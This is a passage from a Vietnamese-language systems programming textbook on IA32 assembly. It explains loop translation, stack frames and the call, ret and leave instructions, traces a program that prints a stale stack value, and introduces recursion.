0x804844c &lt;+20&gt;: jmp    0x8048458 &lt;sumUp2+32&gt; # nhảy tới &lt;sumUp2+32&gt;
0x804844e &lt;+22&gt;: mov    -0x4(%ebp),%eax       # copy i vào %eax
0x8048451 &lt;+25&gt;: add    %eax,-0x8(%ebp)       # total += i
0x8048454 &lt;+28&gt;: addl   $0x1,-0x4(%ebp)       # i += 1
0x8048458 &lt;+32&gt;: mov    -0x4(%ebp),%eax       # copy i vào %eax
0x804845b &lt;+35&gt;: cmp    0x8(%ebp),%eax        # so sánh i với n
0x804845e &lt;+38&gt;: jle    0x804844e &lt;sumUp2+22&gt; # nếu i &lt;= n thì quay lại &lt;sumUp2+22&gt;
0x8048460 &lt;+40&gt;: mov    -0x8(%ebp),%eax       # copy total vào %eax
0x8048463 &lt;+43&gt;: leave                        # chuẩn bị thoát hàm
0x8048464 &lt;+44&gt;: ret                          # trả về total
</code></pre>
<p>Để hiểu tại sao phiên bản <code>for</code> tạo ra code assembly giống hệt với phiên bản <code>while</code>, hãy nhớ rằng vòng lặp <code>for</code> có dạng:</p>
<pre><code class="language-c">for (&lt;khởi tạo&gt;; &lt;biểu thức điều kiện&gt;; &lt;bước lặp&gt;) {
    &lt;thân vòng lặp&gt;
}
</code></pre>
<p>và tương đương với dạng vòng lặp <code>while</code> sau:</p>
<pre><code class="language-c">&lt;khởi tạo&gt;
while (&lt;biểu thức điều kiện&gt;) {
    &lt;thân vòng lặp&gt;
    &lt;bước lặp&gt;
}
</code></pre>
<p>Vì <a href="C8-IA32/../C1-C_intro/conditionals.html#_for_loops">mọi vòng lặp <code>for</code> đều có thể được biểu diễn bằng vòng lặp <code>while</code></a>, nên hai chương trình C dưới đây là các biểu diễn tương đương của đoạn assembly trên:</p>
<div class="table-wrapper"><table><thead><tr><th><strong>For loop</strong></th><th><strong>While loop</strong></th></tr></thead><tbody>
<tr><td>```c</td><td>```c</td></tr>
<tr><td>int sumUp2(int n) {</td><td>int sumUp(int n) {</td></tr>
<tr><td>int total = 0;</td><td>int total = 0;</td></tr>
<tr><td>int i = 1;</td><td>int i = 1;</td></tr>
<tr><td>for (i; i &lt;= n; i++) {</td><td>while (i &lt;= n) {</td></tr>
<tr><td>total += i;</td><td>total += i;</td></tr>
<tr><td>}</td><td>i += 1;</td></tr>
<tr><td>return total;</td><td>}</td></tr>
<tr><td>}</td><td>return total;</td></tr>
<tr><td>```</td><td>}</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 2.</strong> Các cách viết tương đương của hàm <code>sumUp</code>.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="85-functions-trong-assembly"><a class="header" href="#85-functions-trong-assembly">8.5. Functions trong Assembly</a></h2>
<p>Ở phần trước, chúng ta đã lần theo quá trình thực thi của các hàm đơn giản trong assembly.<br />
Trong phần này, chúng ta sẽ tìm hiểu cách nhiều hàm tương tác với nhau trong assembly trong bối cảnh của một chương trình lớn hơn.<br />
Chúng ta cũng sẽ giới thiệu một số lệnh mới liên quan đến việc quản lý hàm.</p>
<p>Hãy bắt đầu bằng việc ôn lại cách <strong>call stack</strong> được quản lý.<br />
Hãy nhớ rằng <code>%esp</code> là <strong>stack pointer</strong> (con trỏ stack) và luôn trỏ tới đỉnh của stack.<br />
Thanh ghi <code>%ebp</code> là <strong>base pointer</strong> (hay <strong>frame pointer</strong>) và trỏ tới đáy của <strong>stack frame</strong> hiện tại.</p>
<p><strong>Stack frame</strong> (còn gọi là <strong>activation frame</strong> hoặc <strong>activation record</strong>) là phần của stack được cấp phát cho một lần gọi hàm.<br />
Hàm đang thực thi luôn nằm ở đỉnh stack, và stack frame của nó được gọi là <strong>active frame</strong>.<br />
Active frame được giới hạn bởi stack pointer (ở đỉnh stack) và frame pointer (ở đáy frame).<br />
Activation record thường chứa các biến cục bộ và tham số của hàm.</p>
<p>Hình 1 cho thấy các stack frame của <code>main</code> và một hàm mà nó gọi tên là <code>fname</code>.<br />
Chúng ta sẽ gọi hàm <code>main</code> là <em>caller</em> (hàm gọi) và <code>fname</code> là <em>callee</em> (hàm được gọi).</p>
<p><img src="C8-IA32/_images/stackFrame.png" alt="an illustration of stack frames" /><br />
<em>Hình 1. Quản lý stack frame</em></p>
<p>Trong Hình 1, <strong>active frame</strong> (stack frame đang hoạt động) thuộc về hàm callee (<code>fname</code>).<br />
Vùng bộ nhớ giữa stack pointer và frame pointer được dùng để lưu các biến cục bộ.<br />
Stack pointer sẽ thay đổi khi các giá trị cục bộ được push hoặc pop khỏi stack.<br />
Ngược lại, frame pointer hầu như giữ nguyên, trỏ tới điểm bắt đầu (đáy) của stack frame hiện tại.<br />
Vì lý do này, các compiler như GCC thường tham chiếu tới các giá trị trên stack dựa theo frame pointer.</p>
<p>Trong Hình 1, active frame được giới hạn phía dưới bởi base pointer của <code>fname</code>, chứa địa chỉ stack <code>0x418</code>.<br />
Giá trị lưu tại địa chỉ này là giá trị <code>%ebp</code> đã được “lưu” (<code>0x42c</code>), bản thân nó chỉ ra đáy của activation frame của hàm <code>main</code>.<br />
Đỉnh của activation frame của <code>main</code> được giới hạn bởi <strong>return address</strong>, cho biết địa chỉ trong chương trình mà <code>main</code> sẽ tiếp tục thực thi khi hàm callee kết thúc.</p>
<blockquote>
<p><strong>Return address trỏ tới bộ nhớ chương trình, không phải bộ nhớ stack</strong><br />
Hãy nhớ rằng vùng call stack (stack memory) của một chương trình khác với vùng code (code memory).<br />
<code>%ebp</code> và <code>%esp</code> trỏ tới các vị trí trong stack memory, còn <code>%eip</code> trỏ tới một vị trí trong <em>code</em> memory.<br />
Nói cách khác, return address là một địa chỉ trong code memory, không phải stack memory:</p>
<p><img src="C8-IA32/_images/memparts.png" alt="The parts of a program's address space." /><br />
<em>Hình 2. Các phần trong không gian địa chỉ của một chương trình</em></p>
</blockquote>
<p><strong>Bảng 1. Các lệnh quản lý hàm thông dụng</strong></p>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Translation</th></tr></thead><tbody>
<tr><td><code>leave</code></td><td>Chuẩn bị stack để thoát khỏi hàm. Tương đương:</td></tr>
<tr><td><code>mov %ebp, %esp</code></td><td></td></tr>
<tr><td><code>pop %ebp</code></td><td></td></tr>
<tr><td><code>call addr &lt;fname&gt;</code></td><td>Chuyển active frame sang hàm callee. Tương đương:</td></tr>
<tr><td><code>push %eip</code></td><td></td></tr>
<tr><td><code>mov addr, %eip</code></td><td></td></tr>
<tr><td><code>ret</code></td><td>Khôi phục active frame về hàm caller. Tương đương:</td></tr>
<tr><td><code>pop %eip</code></td><td></td></tr>
</tbody></table>
</div>
<p>Ví dụ, lệnh <code>leave</code> là dạng viết tắt mà compiler dùng để khôi phục stack pointer và frame pointer khi chuẩn bị thoát khỏi hàm.<br />
Khi hàm callee kết thúc, <code>leave</code> đảm bảo frame pointer được <strong>khôi phục</strong> về giá trị trước đó.</p>
<p>Hai lệnh <code>call</code> và <code>ret</code> đóng vai trò quan trọng khi một hàm gọi hàm khác.<br />
Cả hai đều thay đổi instruction pointer (<code>%eip</code>).<br />
Khi hàm caller thực thi <code>call</code>, giá trị hiện tại của <code>%eip</code> được lưu trên stack như return address — địa chỉ trong chương trình mà caller sẽ tiếp tục thực thi khi callee kết thúc.<br />
<code>call</code> cũng thay thế giá trị <code>%eip</code> bằng địa chỉ của hàm callee.</p>
<p>Lệnh <code>ret</code> khôi phục <code>%eip</code> từ giá trị lưu trên stack, đảm bảo chương trình tiếp tục tại địa chỉ được chỉ định trong hàm caller.<br />
Bất kỳ giá trị trả về nào từ callee sẽ được lưu trong <code>%eax</code>.<br />
<code>ret</code> thường là lệnh cuối cùng trong mọi hàm.</p>
<h3 id="851-lần-theo-một-ví-dụ"><a class="header" href="#851-lần-theo-một-ví-dụ">8.5.1. Lần theo một ví dụ</a></h3>
<p>Dựa trên kiến thức về quản lý hàm, hãy lần theo ví dụ code đã được giới thiệu ở đầu chương:</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;

int assign(void) {
    int y = 40;
    return y;
}

int adder(void) {
    int a;
    return a + 2;
}

int main(void) {
    int x;
    assign();
    x = adder();
    printf(&quot;x is: %d\n&quot;, x);
    return 0;
}
</code></pre>
<p>Chúng ta biên dịch code với cờ <code>-m32</code> và dùng <code>objdump -d</code> để xem code assembly.<br />
Lệnh này xuất ra một file khá lớn với nhiều thông tin không cần thiết.<br />
Dùng <code>less</code> và chức năng tìm kiếm để trích xuất các hàm <code>adder</code>, <code>assign</code> và <code>main</code>:</p>
<pre><code class="language-assembly"> 804840d &lt;assign&gt;:
 804840d:       55                      push   %ebp
 804840e:       89 e5                   mov    %esp,%ebp
 8048410:       83 ec 10                sub    $0x10,%esp
 8048413:       c7 45 fc 28 00 00 00    movl   $0x28,-0x4(%ebp)
 804841a:       8b 45 fc                mov    -0x4(%ebp),%eax
 804841d:       c9                      leave
 804841e:       c3                      ret

 0804841f &lt;adder&gt;:
 804841f:       55                      push   %ebp
 8048420:       89 e5                   mov    %esp,%ebp
 8048422:       83 ec 10                sub    $0x10,%esp
 8048425:       8b 45 fc                mov    -0x4(%ebp),%eax
 8048428:       83 c0 02                add    $0x2,%eax
 804842b:       c9                      leave
 804842c:       c3                      ret

 0804842d &lt;main&gt;:
 804842d:       55                      push   %ebp
 804842e:       89 e5                   mov    %esp,%ebp
 8048433:       83 ec 20                sub    $0x14,%esp
 8048436:       e8 d2 ff ff ff          call   804840d &lt;assign&gt;
 804843b:       e8 df ff ff ff          call   804841f &lt;adder&gt;
 8048440:       89 44 24 1c             mov    %eax,0xc(%esp)
 8048444:       8b 44 24 1c             mov    0xc(%esp),%eax
 8048448:       89 44 24 04             mov    %eax,0x4(%esp)
 804844c:       c7 04 24 f4 84 04 08    movl   $0x80484f4,(%esp)
 8048453:       e8 88 fe ff ff          call   80482e0 &lt;printf@plt&gt;
 8048458:       b8 00 00 00 00          mov    $0x0,%eax
 804845d:       c9                      leave
 804845e:       c3                      ret
</code></pre>
<p>Mỗi hàm bắt đầu bằng một <strong>nhãn ký hiệu</strong> (symbolic label) tương ứng với tên hàm trong chương trình.<br />
Ví dụ, <code>&lt;main&gt;:</code> là nhãn ký hiệu cho hàm <code>main</code>.<br />
Địa chỉ của nhãn hàm cũng là địa chỉ của lệnh đầu tiên trong hàm đó.<br />
Để tiết kiệm không gian trong các hình minh họa tiếp theo, chúng ta rút gọn địa chỉ xuống 12 bit thấp.<br />
Ví dụ, địa chỉ chương trình <code>0x804842d</code> sẽ được hiển thị là <code>0x42d</code>.</p>
<h3 id="852-lần-theo-hàm-main"><a class="header" href="#852-lần-theo-hàm-main">8.5.2. Lần theo hàm main</a></h3>
<p><strong>Hình 3</strong> cho thấy execution stack ngay trước khi thực thi <code>main</code>.</p>
<p><img src="C8-IA32/_images/procedures/Slide1.png" alt="slide1" /></p>
<p><strong>Hình 3</strong> minh họa trạng thái ban đầu của các thanh ghi CPU và call stack trước khi thực thi hàm <code>main</code>.</p>
<p>Hãy nhớ rằng stack phát triển về phía <strong>địa chỉ thấp hơn</strong>.<br />
Trong ví dụ này, <code>%ebp</code> có giá trị địa chỉ <code>0x140</code> và <code>%esp</code> là <code>0x130</code> (cả hai giá trị này chỉ là giả định).<br />
Các thanh ghi <code>%eax</code> và <code>%edx</code> ban đầu chứa giá trị rác.<br />
Mũi tên đỏ (góc trên bên trái) chỉ ra lệnh đang được thực thi.<br />
Ban đầu, <code>%eip</code> chứa địa chỉ <code>0x42d</code>, là địa chỉ trong bộ nhớ chương trình của dòng đầu tiên trong hàm <code>main</code>.<br />
Hãy cùng lần theo quá trình thực thi của chương trình.</p>
<p><img src="C8-IA32/_images/procedures/Slide2.png" alt="slide2" /></p>
<p>Lệnh đầu tiên <strong>push</strong> giá trị của <code>%ebp</code> lên stack, lưu địa chỉ <code>0x140</code>.<br />
Vì stack phát triển về phía địa chỉ thấp hơn, stack pointer <code>%esp</code> được cập nhật thành <code>0x12c</code> (giảm 4 byte so với <code>0x130</code>).<br />
Thanh ghi <code>%eip</code> tăng lên để trỏ tới lệnh tiếp theo.</p>
<p><img src="C8-IA32/_images/procedures/Slide3.png" alt="slide3" /></p>
<p>Lệnh tiếp theo (<code>mov %esp, %ebp</code>) cập nhật giá trị của <code>%ebp</code> thành giá trị của <code>%esp</code>.<br />
Frame pointer (<code>%ebp</code>) giờ trỏ tới đầu stack frame của hàm <code>main</code>.<br />
<code>%eip</code> tiếp tục trỏ tới lệnh kế tiếp.</p>
<p><img src="C8-IA32/_images/procedures/Slide4.png" alt="slide4" /></p>
<p>Lệnh <code>sub</code> trừ <code>0x14</code> khỏi địa chỉ trong stack pointer, “mở rộng” stack thêm 20 byte.<br />
<code>%eip</code> trỏ tới lệnh tiếp theo, đây là lệnh <code>call</code> đầu tiên.</p>
<p><img src="C8-IA32/_images/procedures/Slide5.png" alt="slide5" /></p>
<p>Lệnh <code>call &lt;assign&gt;</code> sẽ <strong>push</strong> giá trị trong <code>%eip</code> (địa chỉ của lệnh <em>tiếp theo</em> sẽ thực thi) lên stack.<br />
Vì lệnh tiếp theo sau <code>call &lt;assign&gt;</code> có địa chỉ <code>0x43b</code>, giá trị này được đẩy lên stack làm <strong>return address</strong>.<br />
Hãy nhớ rằng return address cho biết chương trình sẽ tiếp tục thực thi ở đâu khi hàm kết thúc và quay lại <code>main</code>.</p>
<p>Sau đó, lệnh <code>call</code> sẽ đưa địa chỉ của hàm <code>assign</code> (<code>0x40d</code>) vào <code>%eip</code>, báo hiệu rằng chương trình sẽ tiếp tục thực thi trong hàm được gọi (<code>assign</code>) thay vì lệnh tiếp theo trong <code>main</code>.</p>
<p><img src="C8-IA32/_images/procedures/Slide6.png" alt="slide6" /></p>
<p>Hai lệnh đầu tiên trong hàm <code>assign</code> là các thao tác khởi tạo mà mọi hàm đều thực hiện.<br />
Lệnh đầu tiên <strong>push</strong> giá trị trong <code>%ebp</code> (địa chỉ <code>0x12c</code>) lên stack.<br />
Hãy nhớ rằng địa chỉ này trỏ tới đầu stack frame của <code>main</code>.<br />
<code>%eip</code> trỏ tới lệnh thứ hai trong <code>assign</code>.</p>
<p><img src="C8-IA32/_images/procedures/Slide7.png" alt="slide7" /></p>
<p>Lệnh tiếp theo (<code>mov %esp, %ebp</code>) cập nhật <code>%ebp</code> để trỏ tới đỉnh stack, đánh dấu bắt đầu stack frame của <code>assign</code>.<br />
Instruction pointer (<code>%eip</code>) trỏ tới lệnh kế tiếp trong <code>assign</code>.</p>
<p><img src="C8-IA32/_images/procedures/Slide8.png" alt="slide8" /></p>
<p>Lệnh <code>sub</code> tại địa chỉ <code>0x410</code> mở rộng stack thêm 16 byte, tạo không gian lưu trữ giá trị cục bộ và cập nhật <code>%esp</code>.<br />
Instruction pointer tiếp tục trỏ tới lệnh kế tiếp trong <code>assign</code>.</p>
<p><img src="C8-IA32/_images/procedures/Slide9.png" alt="slide9" /></p>
<p>Lệnh <code>mov</code> tại địa chỉ <code>0x413</code> đưa giá trị <code>$0x28</code> (tức 40) vào vị trí <code>-0x4(%ebp)</code> trên stack, tức là 4 byte phía trên frame pointer.<br />
Hãy nhớ rằng frame pointer thường được dùng để tham chiếu tới các vị trí trên stack.<br />
<code>%eip</code> trỏ tới lệnh kế tiếp trong <code>assign</code>.</p>
<p><img src="C8-IA32/_images/procedures/Slide10.png" alt="slide10" /></p>
<p>Lệnh <code>mov</code> tại địa chỉ <code>0x41a</code> đưa giá trị <code>$0x28</code> vào thanh ghi <code>%eax</code>, là nơi lưu giá trị trả về của hàm.<br />
<code>%eip</code> trỏ tới lệnh <code>leave</code> trong <code>assign</code>.</p>
<p><img src="C8-IA32/_images/procedures/Slide11.png" alt="slide11" /></p>
<p>Tại thời điểm này, hàm <code>assign</code> gần như đã thực thi xong.<br />
Lệnh tiếp theo được thực thi là lệnh <code>leave</code>, lệnh này chuẩn bị stack để trả về từ lời gọi hàm.<br />
Hãy nhớ rằng <code>leave</code> tương đương với cặp lệnh sau:</p>
<pre><code>mov %ebp, %esp
pop %ebp
</code></pre>
<p>Nói cách khác, CPU ghi đè giá trị của stack pointer bằng giá trị của frame pointer.<br />
Trong ví dụ này, stack pointer ban đầu được cập nhật từ <code>0x100</code> thành <code>0x110</code>.<br />
Tiếp theo, CPU thực thi <code>pop %ebp</code>, lấy giá trị tại địa chỉ <code>0x110</code> (trong ví dụ này là <code>0x12c</code>) và đặt vào <code>%ebp</code>.<br />
Hãy nhớ rằng <code>0x12c</code> là điểm bắt đầu của stack frame dành cho <code>main</code>.<br />
<code>%esp</code> trở thành <code>0x114</code> và <code>%eip</code> trỏ tới lệnh <code>ret</code> trong hàm <code>assign</code>.</p>
<p><img src="C8-IA32/_images/procedures/Slide12.png" alt="slide12" /></p>
<p>Lệnh cuối cùng trong <code>assign</code> là <code>ret</code>. Khi <code>ret</code> được thực thi, địa chỉ trả về sẽ được lấy ra khỏi stack và đưa vào thanh ghi <code>%eip</code>.<br />
Trong ví dụ này, <code>%eip</code> được cập nhật để trỏ tới lời gọi hàm <code>adder</code>.</p>
<p>Một số điểm quan trọng cần lưu ý tại thời điểm này:</p>
<ul>
<li>Stack pointer và frame pointer đã được khôi phục về giá trị trước khi gọi <code>assign</code>, phản ánh rằng stack frame của <code>main</code> lại trở thành active frame.</li>
<li>Các giá trị cũ trên stack từ stack frame trước đó <strong>không</strong> bị xóa. Chúng vẫn tồn tại trên call stack.</li>
</ul>
<p><img src="C8-IA32/_images/procedures/Slide13.png" alt="slide13" /></p>
<p>Lời gọi hàm <code>adder</code> <strong>ghi đè</strong> địa chỉ trả về cũ trên stack bằng một địa chỉ trả về mới (<code>0x440</code>).<br />
Địa chỉ này trỏ tới lệnh sẽ được thực thi tiếp theo sau khi <code>adder</code> trả về, đó là <code>mov %eax, 0xc(%ebp)</code>.<br />
<code>%eip</code> lúc này trỏ tới lệnh đầu tiên trong <code>adder</code> tại địa chỉ <code>0x41f</code>.</p>
<p><img src="C8-IA32/_images/procedures/Slide14.png" alt="slide14" /></p>
<p>Lệnh đầu tiên trong hàm <code>adder</code> lưu frame pointer của hàm gọi (<code>%ebp</code> của <code>main</code>) lên stack.</p>
<p><img src="C8-IA32/_images/procedures/Slide15.png" alt="slide15" /></p>
<p>Lệnh tiếp theo cập nhật <code>%ebp</code> bằng giá trị hiện tại của <code>%esp</code> (địa chỉ <code>0x110</code>).<br />
Hai lệnh này cùng nhau thiết lập điểm bắt đầu của stack frame cho <code>adder</code>.</p>
<p><img src="C8-IA32/_images/procedures/Slide16.png" alt="slide16" /></p>
<p>Lệnh <code>sub</code> tại địa chỉ <code>0x422</code> “mở rộng” stack thêm 16 byte.<br />
Lưu ý rằng việc mở rộng stack không ảnh hưởng tới các giá trị đã tồn tại trước đó trên stack.<br />
Những giá trị cũ sẽ vẫn nằm trên stack cho tới khi bị ghi đè.</p>
<p><img src="C8-IA32/_images/procedures/Slide17.png" alt="slide20" /></p>
<p>Hãy chú ý tới lệnh tiếp theo:<br />
<code>mov $-0x4(%ebp), %eax</code>.<br />
Lệnh này di chuyển <strong>một giá trị cũ</strong> đang nằm trên stack vào thanh ghi <code>%eax</code>!<br />
Điều này xảy ra trực tiếp do lập trình viên quên khởi tạo biến <code>a</code> trong hàm <code>adder</code>.</p>
<p><img src="C8-IA32/_images/procedures/Slide18.png" alt="slide18" /></p>
<p>Lệnh <code>add</code> tại địa chỉ <code>0x428</code> cộng 2 vào giá trị trong <code>%eax</code>.<br />
Hãy nhớ rằng IA32 truyền giá trị trả về qua <code>%eax</code>.<br />
Hai lệnh cuối này tương đương với đoạn code trong <code>adder</code>:</p>
<pre><code class="language-c">int a;
return a + 2;
</code></pre>
<p><img src="C8-IA32/_images/procedures/Slide19.png" alt="slide19" /></p>
<p>Sau khi <code>leave</code> được thực thi, frame pointer lại trỏ tới đầu stack frame của <code>main</code> (<code>0x12c</code>).<br />
Stack pointer lúc này chứa địa chỉ <code>0x114</code>.</p>
<p><img src="C8-IA32/_images/procedures/Slide20.png" alt="slide20" /></p>
<p>Lệnh <code>ret</code> lấy địa chỉ trả về ra khỏi stack, khôi phục <code>%eip</code> về <code>0x440</code> — địa chỉ của lệnh tiếp theo trong <code>main</code>.<br />
<code>%esp</code> lúc này là <code>0x118</code>.</p>
<p><img src="C8-IA32/_images/procedures/Slide21.png" alt="slide21" /></p>
<p>Lệnh <code>mov %eax, 0xc(%esp)</code> đặt giá trị trong <code>%eax</code> vào vị trí cách <code>%esp</code> 12 byte (tức ba ô nhớ).</p>
<p><img src="C8-IA32/_images/procedures/Slide23.png" alt="slide23" /></p>
<p>Bỏ qua một vài bước, các lệnh <code>mov</code> tại địa chỉ <code>0x444</code> và <code>0x448</code> gán <code>%eax</code> bằng giá trị lưu tại <code>%esp+12</code> (<code>0x2A</code>) và đặt <code>0x2A</code> vào vị trí ngay dưới đỉnh stack (<code>%esp + 4</code>, tức <code>0x11c</code>).</p>
<p><img src="C8-IA32/_images/procedures/Slide24.png" alt="slide24" /></p>
<p>Lệnh tiếp theo (<code>mov $0x80484f4, (%esp)</code>) sao chép một hằng số là địa chỉ bộ nhớ lên đỉnh stack.<br />
Địa chỉ này (<code>0x80484f4</code>) chứa chuỗi <code>&quot;x is %d\n&quot;</code>.<br />
<code>%eip</code> trỏ tới lời gọi hàm <code>printf</code> (<code>&lt;printf@plt&gt;</code>).</p>
<p><img src="C8-IA32/_images/procedures/Slide25.png" alt="slide25" /></p>
<p>Để ngắn gọn, chúng ta sẽ không lần theo hàm <code>printf</code> (thuộc <code>stdio.h</code>).<br />
Tuy nhiên, theo trang hướng dẫn (<code>man -s3 printf</code>), <code>printf</code> có dạng:</p>
<pre><code class="language-c">int printf(const char * format, ...);
</code></pre>
<p>Nói cách khác, tham số đầu tiên là con trỏ tới chuỗi định dạng, các tham số tiếp theo là các giá trị được chèn vào định dạng đó.<br />
Các lệnh từ <code>0x444</code> đến <code>0x45c</code> tương ứng với dòng code trong <code>main</code>:</p>
<pre><code class="language-c">printf(&quot;x is %d\n&quot;, x);
</code></pre>
<p>Khi <code>printf</code> được gọi:</p>
<ul>
<li>Địa chỉ trả về (lệnh sẽ thực thi sau <code>printf</code>) được đẩy lên stack.</li>
<li>Giá trị <code>%ebp</code> được đẩy lên stack, và <code>%ebp</code> được cập nhật để trỏ tới đỉnh stack, đánh dấu bắt đầu stack frame của <code>printf</code>.</li>
</ul>
<p>Tại một thời điểm nào đó, <code>printf</code> sẽ truy cập các tham số của nó: chuỗi <code>&quot;x is %d\n&quot;</code> và giá trị <code>0x2A</code>.<br />
Hãy nhớ rằng địa chỉ trả về nằm ngay dưới <code>%ebp</code> tại <code>%ebp+4</code>.<br />
Tham số đầu tiên nằm tại <code>%ebp+8</code> (ngay dưới địa chỉ trả về), tham số thứ hai tại <code>%ebp+12</code>.</p>
<p>Với một hàm có <em>n</em> tham số, GCC đặt tham số thứ nhất tại <code>%ebp+8</code>, tham số thứ hai tại <code>%ebp+12</code>, và tham số thứ <em>n</em> tại <code>(%ebp+8) + (4*(n-1))</code>.</p>
<p>Sau khi <code>printf</code> được gọi, giá trị <code>0x2A</code> được in ra màn hình ở dạng số nguyên, tức là in ra <strong>42</strong>.</p>
<p><img src="C8-IA32/_images/procedures/Slide26.png" alt="slide26" /></p>
<p>Sau khi gọi <code>printf</code>, một vài lệnh cuối sẽ dọn dẹp stack và chuẩn bị thoát khỏi <code>main</code>.<br />
Đầu tiên, giá trị <code>0x0</code> được đặt vào <code>%eax</code>, báo hiệu rằng <code>main</code> trả về 0.<br />
Hãy nhớ rằng chương trình trả về 0 để biểu thị kết thúc thành công.</p>
<p><img src="C8-IA32/_images/procedures/Slide27.png" alt="slide27" /></p>
<p>Sau khi <code>leave</code> và <code>ret</code> được thực thi, stack pointer và frame pointer trở về giá trị ban đầu trước khi <code>main</code> chạy.<br />
Với <code>0x0</code> trong <code>%eax</code>, chương trình trả về 0.</p>
<p>Nếu bạn đã đọc kỹ phần này, bạn sẽ hiểu vì sao chương trình in ra giá trị <strong>42</strong>.<br />
Về bản chất, chương trình đã vô tình sử dụng các giá trị cũ trên stack, khiến nó hoạt động theo cách không mong đợi.<br />
Ví dụ này khá vô hại, nhưng ở các phần sau, chúng ta sẽ thấy cách hacker lợi dụng lời gọi hàm để khiến chương trình hoạt động sai lệch theo hướng thực sự nguy hiểm.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="86-Đệ-quy-recursion"><a class="header" href="#86-Đệ-quy-recursion">8.6. Đệ quy (Recursion)</a></h2>
<p>Các <strong>recursive function</strong> (hàm đệ quy) là một lớp đặc biệt của hàm, trong đó hàm tự gọi lại chính nó (còn được gọi là <strong>self-referential</strong> function — “hàm tự tham chiếu”) để tính toán một giá trị. Giống như các hàm không đệ quy, <strong>recursive function</strong> tạo ra các <em>stack frame</em> mới cho mỗi lần gọi hàm. Tuy nhiên, khác với các hàm thông thường, <strong>recursive function</strong> chứa các lời gọi hàm tới chính nó.</p>
<p>Hãy cùng xem lại bài toán tính tổng các số nguyên dương từ <em>1</em> đến <em>n</em>. Ở các phần trước, chúng ta đã thảo luận về hàm <code>sumUp</code> để thực hiện nhiệm vụ này. Bảng 1 dưới đây cho thấy một hàm liên quan có tên <code>sumDown</code>, hàm này cộng các số theo thứ tự ngược (<em>n</em> về <em>1</em>), và phiên bản đệ quy tương đương của nó là <code>sumr</code>:</p>
<h4 id="iterative-lặp-sumdown"><a class="header" href="#iterative-lặp-sumdown">Iterative (lặp): <code>sumDown</code></a></h4>
<pre><code class="language-c">int sumDown(int n) {
    int total = 0;
    int i = n;
    while (i &gt; 0) {
        total += i;
        i--;
    }
    return total;
}
</code></pre>
<h4 id="recursive-đệ-quy-sumr"><a class="header" href="#recursive-đệ-quy-sumr">Recursive (đệ quy): <code>sumr</code></a></h4>
<pre><code class="language-c">int sumr(int n) {
    if (n &lt;= 0) {
        return 0;
    }
    return n + sumr(n-1);
}
</code></pre>
<p><strong>Bảng 1.</strong> Phiên bản lặp (<code>sumDown</code>) và phiên bản đệ quy (<code>sumr</code>)</p>
<p>Trường hợp cơ sở (<em>base case</em>) trong <strong>recursive function</strong> <code>sumr</code> xử lý mọi giá trị <em>n</em> nhỏ hơn 1, và bước đệ quy (<em>recursive step</em>) sẽ cộng giá trị hiện tại của <em>n</em> với kết quả của lời gọi hàm <code>sumr</code> với giá trị <em>n-1</em>. Khi biên dịch <code>sumr</code> với cờ <code>-m32</code> và dịch ngược (disassemble) bằng GDB, ta thu được đoạn code Assembly sau:</p>
<pre><code>0x0804841d &lt;+0&gt;:  push  %ebp                  # lưu ebp
0x0804841e &lt;+1&gt;:  mov   %esp,%ebp             # cập nhật ebp (tạo stack frame mới)
0x08048420 &lt;+3&gt;:  sub   $0x8,%esp             # cấp thêm 8 byte cho stack frame
0x08048423 &lt;+6&gt;:  cmp   $0x0,0x8(%ebp)        # so sánh ebp+8 (n) với 0
0x08048427 &lt;+10&gt;: jg    0x8048430 &lt;sumr+19&gt;   # nếu (n &gt; 0) thì nhảy tới &lt;sumr+19&gt;
0x08048429 &lt;+12&gt;: mov   $0x0,%eax             # gán 0 vào eax (result)
0x0804842e &lt;+17&gt;: jmp   0x8048443 &lt;sumr+38&gt;   # nhảy tới &lt;sumr+38&gt;
0x08048430 &lt;+19&gt;: mov   0x8(%ebp),%eax        # gán n vào eax (result)
0x08048433 &lt;+22&gt;: sub   $0x1,%eax             # trừ 1 từ n (result--)
0x08048436 &lt;+25&gt;: mov   %eax,(%esp)           # đưa n-1 lên đỉnh stack
0x08048439 &lt;+28&gt;: call  0x804841d &lt;sumr&gt;      # gọi hàm sumr()
0x0804843e &lt;+33&gt;: mov   0x8(%ebp),%edx        # gán n vào edx
0x08048441 &lt;+36&gt;: add   %edx,%eax             # cộng n vào kết quả (result += n)
0x08048443 &lt;+38&gt;: leave                       # chuẩn bị thoát hàm
0x08048444 &lt;+39&gt;: ret                         # trả về kết quả
</code></pre>
<p>Mỗi dòng trong đoạn code Assembly trên đều được chú thích bằng tiếng Anh. Bảng 2 dưới đây cho thấy dạng tương ứng sử dụng <code>goto</code> và chương trình C không dùng <code>goto</code>:</p>
<h4 id="c-dạng-goto"><a class="header" href="#c-dạng-goto">C dạng goto</a></h4>
<pre><code class="language-c">int sumr(int n) {
    int result;
    if (n &gt; 0) {
        goto body;
    }
    result = 0;
    goto done;
        body:
            result = n;
            result -= 1;
            result = sumr(result);
            result += n;
        done:
    return result;
}
</code></pre>
<h4 id="c-không-dùng-goto"><a class="header" href="#c-không-dùng-goto">C không dùng goto</a></h4>
<pre><code class="language-c">int sumr(int n) {
    int result;
    if (n &lt;= 0) {
        return 0;
    }
    result = sumr(n-1);
    result += n;
    return result;
}
</code></pre>
<p><strong>Bảng 2.</strong> Dạng C dùng <code>goto</code> và bản dịch từ code Assembly của <code>sumr</code></p>
<p>Mặc dù bản dịch này ban đầu có thể trông không hoàn toàn giống với hàm <code>sumr</code> gốc, nhưng khi xem xét kỹ, ta thấy hai hàm này thực sự tương đương nhau.</p>
<h3 id="861-quan-sát-sự-thay-đổi-của-call-stack"><a class="header" href="#861-quan-sát-sự-thay-đổi-của-call-stack">8.6.1. Quan sát sự thay đổi của Call Stack</a></h3>
<p>Như một bài tập, chúng tôi khuyến khích bạn tự vẽ ra <em>stack</em> và quan sát cách các giá trị thay đổi. Ảnh dưới đây minh họa cách <em>stack</em> được cập nhật khi chúng ta chạy hàm này với giá trị 3.</p>
<p><img src="C8-IA32/_images/recursion.gif" alt="recursion" /></p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="87-mảng-arrays"><a class="header" href="#87-mảng-arrays">8.7. Mảng (Arrays)</a></h2>
